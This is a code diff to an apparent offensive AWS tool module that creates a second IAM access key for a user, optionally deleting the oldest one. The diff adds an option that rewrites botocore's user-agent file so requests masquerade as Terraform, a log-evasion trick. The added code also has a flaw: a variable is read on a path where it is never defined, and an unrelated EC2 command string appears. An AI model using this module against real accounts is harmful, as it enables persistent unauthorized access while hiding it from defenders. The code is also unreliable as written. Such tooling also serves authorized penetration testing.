@@ -30,14 +30,45 @@ variables = {
 		"value": "false",
 		"required": "true",
         "description":"The username to add the 2nd key. If not set, the current credentials will gain a 2nd key. The user needs to have only one credential to be able to use this module."
+	},
+	"TERRAFORM": {
+		"value": "false",
+		"required": "true",
+        "description":"Set TERRAFORM to true if you want the tool to simulate TERRAFORM"
 	}
 }
 description = "Create a 2nd access key to a user. To do this, the user needs to have only one access key. If the user has 2 access keys and OVERRIDE-OLDEST-ACCESS-KEY is set to true, the oldest created access key will be deleted and a new one will be created."
 
 aws_command = "aws ec2 describe-launch-templates --region {} --profile {}"
 
-def exploit(profile, workspace):
+def exploit(all_sessions, cred_prof, useragent, web_proxies, callstoprofile):
 	user = variables['USER']['value']
+
+	if variables['TERRAFORM']['value'] == "true":
+		currentua = None
+
+		if os.path.exists(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent"):
+			with open(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent", "r") as uafile:
+				currentua = uafile.read().replace("\n", "").strip()
+
+		with open(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent", "w") as uafile:
+			uafile.write(
+				"APN/1.0 HashiCorp/1.0 Terraform/1.8.5 (+https://www.terraform.io) terraform-provider-aws/5.57.0 (+https://registry.terraform.io/providers/hashicorp/aws) aws-sdk-go-v2/1.30.1 os/linux lang/go#1.22.4 md/GOOS#linux md/GOARCH#amd64 api/iam#1.30.1"
+			)
+
+	profile = giveMeClient(
+		all_sessions,
+		cred_prof,
+		useragent,
+		web_proxies,
+		"iam"
+	)
+
+	if currentua is not None:
+		with open(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent", "w") as uafile:
+			uafile.write(currentua)
+	else:
+		os.remove(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent")
 
 	try:
 		if not user == "":
